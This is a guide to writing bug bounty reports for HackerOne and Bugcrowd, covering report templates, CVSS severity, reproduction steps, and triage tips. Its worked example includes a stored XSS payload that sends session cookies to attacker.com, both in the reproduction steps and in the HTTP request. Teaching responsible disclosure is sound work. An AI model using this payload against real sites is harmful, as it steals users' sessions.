# Bug Bounty Report Workflow

Generate platform-optimized vulnerability reports for HackerOne, Bugcrowd, and similar bug bounty programs.

## Title Format

Use a clear, specific title that communicates the vulnerability at a glance:

```
[Vulnerability Type] in [Component/Endpoint] allows [Impact]
```

**Examples:**
- `Stored XSS in /profile/bio allows session hijacking of any user`
- `IDOR in /api/v2/invoices/{id} allows reading any customer's billing data`
- `SSRF via PDF export at /reports/generate allows internal network scanning`
- `SQL Injection in /search?q= parameter allows full database extraction`

---

## Report Template

### Title

`[Type] in [Location] allows [Impact]`

### Vulnerability Type

Select the most specific type. Common categories:

- Cross-Site Scripting (XSS) — Reflected / Stored / DOM-based
- SQL Injection — Error-based / Blind / Time-based
- Server-Side Request Forgery (SSRF)
- Insecure Direct Object Reference (IDOR)
- Remote Code Execution (RCE)
- Authentication Bypass
- Authorization Flaw / Privilege Escalation
- Cross-Site Request Forgery (CSRF)
- Information Disclosure
- Business Logic Flaw
- Race Condition
- Open Redirect
- XML External Entity (XXE)
- Server-Side Template Injection (SSTI)

### Severity

Rate using the program's severity scale. Map to CVSS 3.1 when possible:

| Severity | CVSS | Typical Bounty Range |
|----------|------|---------------------|
| Critical | 9.0–10.0 | $5,000 – $50,000+ |
| High | 7.0–8.9 | $2,000 – $15,000 |
| Medium | 4.0–6.9 | $500 – $5,000 |
| Low | 0.1–3.9 | $100 – $1,000 |

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

### Description

Write 2–4 paragraphs covering:

1. **What** — The vulnerability and where it exists
2. **Why** — The root cause (missing input validation, broken access control, etc.)
3. **So what** — The security impact in concrete terms

Be specific. Reference the exact endpoint, parameter, or code path.

### Steps to Reproduce

Number every step. Assume the triager has no context:

```
1. Create a standard user account at https://target.com/register
2. Log in and navigate to https://target.com/settings/profile
3. In the "Bio" field, enter the following payload:
   <img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
4. Click "Save Profile"
5. Open a new browser (or incognito window) and log in as a different user
6. Navigate to the first user's profile at https://target.com/user/attacker
7. Observe: the JavaScript executes in the victim's browser context
8. Check the attacker's server logs — the victim's session cookie has been exfiltrated
```

**Include:**
- Exact URLs (redact only truly sensitive tokens)
- Full HTTP requests (method, headers, body)
- Exact payloads used
- Expected vs. actual behavior at each step
- Screenshots or video recording

### HTTP Request/Response (if applicable)

```http
POST /api/v2/profile HTTP/1.1
Host: target.com
Authorization: Bearer eyJ...
Content-Type: application/json

{"bio": "<img src=x onerror=\"fetch('https://attacker.com/steal?c='+document.cookie)\">"}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"status": "success", "message": "Profile updated"}
```

### Impact

Describe the worst realistic outcome. Be specific, not hypothetical:

- **Who** is affected (all users, admins, specific roles)
- **What** data or functionality is compromised
- **Scale** — how many users/records are at risk
- **Chain potential** — can this be combined with other bugs for greater impact

**Example:**
> An attacker can read any customer's invoices by iterating the `id` parameter from 1 to N. The endpoint returns full billing details including name, address, email, payment method (last 4 digits), and transaction history. With ~50,000 active customers, this represents a significant data breach risk.

### Remediation Suggestion

Provide actionable fixes:

```
1. Implement server-side authorization checks on /api/v2/invoices/{id}
   - Verify the requesting user owns the invoice before returning data
   - Return 403 Forbidden for unauthorized access attempts

2. Add rate limiting to prevent enumeration (e.g., 100 req/min per user)

3. Replace sequential integer IDs with UUIDs to reduce predictability
```

### References

- Relevant CWE entry
- OWASP reference page
- Similar disclosed vulnerabilities (if public)
- Vendor documentation on the affected feature

---

## Tips for Faster Triage

### Do

- **Test on the latest version** — Triagers will check if it's already patched
- **One vulnerability per report** — Don't bundle unrelated findings
- **Use the program's asset list** — Confirm the target is in scope before reporting
- **Provide a working PoC** — Screenshots > descriptions. Video > screenshots. Working exploit > video.
- **Include impact** — "XSS exists" gets deprioritized. "XSS allows full account takeover" gets attention.
- **Be professional** — No threats, no demands, no "I could have done worse"
- **Respond to questions quickly** — Triagers move on if you go silent
- **Mention if it's chained** — If the bug requires chaining, be upfront and explain the full chain

### Don't

- **Don't test destructively** — No mass deletion, no DoS, no accessing real user data beyond proof
- **Don't report scanner output** — Validate every finding manually before submitting
- **Don't duplicate** — Search existing reports first. Getting N/A for a dupe wastes everyone's time
- **Don't exaggerate severity** — Inflated CVSS scores damage your reputation
- **Don't include out-of-scope targets** — Read the policy. Twice.
- **Don't submit self-XSS** — If the victim has to paste your payload into their own console, it's not a vulnerability
- **Don't use automated tools against targets without permission** — Respect rate limits and scanning policies

### Severity Calibration

Common over-ratings to avoid:

| Finding | Often Rated | Usually Is |
|---------|------------|------------|
| Reflected XSS (no auth bypass) | High | Medium |
| Missing rate limiting (login) | High | Low–Medium |
| CSRF on non-sensitive action | Medium | Low |
| Information disclosure (version number) | Medium | Low–Info |
| Open redirect (no chain) | Medium | Low |
| Missing security headers | Medium | Informational |
| Self-XSS | Low | N/A |

### Platform-Specific Notes

**HackerOne:**
- Use their severity calculator to set CVSS
- Markdown formatting is fully supported
- Attach files directly (screenshots, videos, PoC scripts)
- Reports with clear repro steps average 2x faster triage

**Bugcrowd:**
- Follow their Vulnerability Rating Taxonomy (VRT) for severity
- P1–P4 scale maps roughly to Critical–Low
- Technical severity + business impact both matter
- Submissions with video PoCs get prioritized
